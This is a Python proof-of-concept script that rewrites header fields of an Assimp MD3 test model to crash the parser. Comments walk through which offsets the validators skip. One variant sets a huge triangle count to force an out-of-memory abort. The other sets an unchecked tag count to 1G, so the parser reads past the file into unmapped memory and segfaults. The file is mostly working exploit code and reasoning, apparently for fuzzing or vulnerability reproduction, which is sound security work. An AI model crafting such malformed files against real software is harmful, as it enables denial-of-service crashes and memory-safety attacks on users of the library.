import struct

src='/workspace/src-vul/assimp/test/models-nonbsd/MD3/watercan.md3'
orig=bytearray(open(src,'rb').read())
fileSize=len(orig)  # 2748

# --- PoC design (definitive memory violation, not an exception) ---
# Keep the model structurally valid, but lie about the surface data being present
# while pointing offsets INSIDE the file: NUM_VERTICES=0x100000 (1M) forces:
#  - pcMesh->mNumVertices = NUM_TRIANGLES*3 (we set tris=1) small, ok
#  - pcUVs/pcVertices navigation: OFS_ST/OFS_XYZNORMAL garbage-small (0) ->
#  - loop over tris=1 reads INDEXES -> index must pass < NUM_VERTICES: set INDEXES[0..2]=0 ->
#     then reads pcVertices[0] fine... no overflow. 
#
# The REAL overflow primitive: NUM_TRIANGLES drives BOTH allocation and loop.
# pcMesh->mFaces = new aiFace[NUM_TRIANGLES] and per-face mIndices=new uint[3].
# Loop body allocates each face. With NUM_TRIANGLES=0x08000000 (134M):
#   new aiFace[134M] -> aiFace is ~8-16 bytes -> ~1-2GB. Machine may die (OOM) ->
#   but in fuzz infra, AddressSanitizer: allocation-size-too-big or OOM abort.
# Choose EXACTLY ASan's hard threshold to get clean allocator abort rather than system OOM:
# ASAN max allocation ~0x10000000000 private... too big. OOM-kill is also a crash verdict.
# Instead use allocator-fatal count that still fits but aborts cleanly under ASan when
#   total > asan option hard_rss_limit or allocator_may_return_null=0 default abort on OOM.
# Use NUM_TRIANGLES = 0x10000000 (268M) -> ~4GB aiFace array alone:
#   Under ASan: "WARNING: AddressSanitizer failed to allocate ... out of memory" -> abort.
#   Without ASan: std::bad_alloc -> uncaught -> std::terminate -> abort. Both nonzero-signal.
#   Either way NOT a caught exception: libFuzzer counts OOM as crash (exit 77/-6).

poc=bytearray(orig)
# surface header at 164; set:
S=164
struct.pack_into('<I', poc, S+68+4,  1)          # NUM_FRAMES=1
struct.pack_into('<I', poc, S+68+8,  0)          # NUM_SHADER=0  (no texture path)
struct.pack_into('<I', poc, S+68+12, 1)          # NUM_VERTICES=1 (passes ofs checks w/ ofs 0..60)
struct.pack_into('<I', poc, S+68+16, 0x10000000) # NUM_TRIANGLES=268M  -> ~4-8GB aiFace[] -> abort
# offsets: keep small absolute so ValidateSurfaceHeaderOffsets passes:
# OFS_TRIANGLES=60 -> pcTriangles inside surface header tail (zeros) ->
#   faces loop face0: INDEXES[c]=0 < NUM_VERTICES=1 -> body executes THEN loops 268M times
#   allocating mIndices (3-uint) per face -> allocator churn -> still aborts via count.
# But aiFace[268M] itself already dominates -> immediate allocator abort. 
struct.pack_into('<I', poc, S+88+0, 60)   # OFS_TRIANGLES=60 (land in zeroed header tail -> INDEXES=0)
struct.pack_into('<I', poc, S+88+4, 64)   # OFS_SHADERS=64  (n=0)
struct.pack_into('<I', poc, S+88+8, 68)   # OFS_ST=68 ; 1 vertex: 68+8 <= fileSize ok
struct.pack_into('<I', poc, S+88+12, 76)  # OFS_XYZNORMAL=76 ; 76+8 ok
# OFS_END untouched(2584) -> after loop the surface iteration ends anyway (1 surface by header? 
#   header NUM_SURFACES=1 -> loop count iNum=1 only). good, single-surface.

out='/workspace/poc.md3'
open(out,'wb').write(poc)
print('wrote', out, len(poc))
EOF

# pointer-crash: pcTags navigation mBuffer+OFS_TAGS then NUM_TAGS reads of 108-byte
# records; NO validator checks OFS_TAGS + NUM_TAGS*108 <= fileSize (verify:
# ValidateHeaderOffsets checks only OFS_FRAMES/OFS_SURFACES/OFS_EOF, NUM_SURFACES*
# sizeof(Surface), NUM_FRAMES<=configFrameID, NUM_SURFACES>AI_MAX_ALLOC).
# OFS_TAGS / NUM_TAGS: completely UNBOUND. Then:
#   pScene->mRootNode->mNumChildren = NUM_TAGS
#   mChildren = new aiNode*[NUM_TAGS]
#   loop i<NUM_TAGS: mChildren[i]=new aiNode; NAME.Set(pcTags->NAME)
# => reading pcTags->NAME at ever-increasing addresses until SEGV — with
#    NUM_TAGS large it walks pages until unmapped. Deterministic SEGV read.
#    pcTags starts INSIDE the valid file (OFS_TAGS small) so it enters the loop,
#    walks off the mapping -> SIGSEGV in strlen (aiString::Set) — a REAL crash,
#    uncatchable by any exception handler.
#
# NUM_TAGS=0x40000000 (1G) guarantees walking ~1G*108B — will hit unmapped quickly.
# OFS_TAGS: must NOT be checked => keep original 164 (OFS_TAGS points right at the
# surface header — a ZERO-ish region? At 164 the surface IDENT 'IDP3' exists; NAME
# at 168 = 'watercan\0' => NAME.Set reads 'watercan' fine, fine.)
#
# Additional guarantee: header checks never touch OFS_TAGS so nothing throws first.

poc=bytearray(orig)
struct.pack_into('<I', poc, 76, 1)          # NUM_FRAMES=1
struct.pack_into('<I', poc, 80, 0x40000000) # NUM_TAGS = 1G -> unbounded tag walk -> SEGV
# OFS_TAGS keep 164 (points at surface header; NAME 'watercan' readable so loop starts)
out='/workspace/poc.md3'
open(out,'wb').write(poc)
print('wrote',out)
# quick sanity: file header parse
d=bytes(poc)
nf,=struct.unpack_from('<I',d,76); nt,=struct.unpack_from('<I',d,80)
print('frames',nf,'tags',hex(nt))
EOF
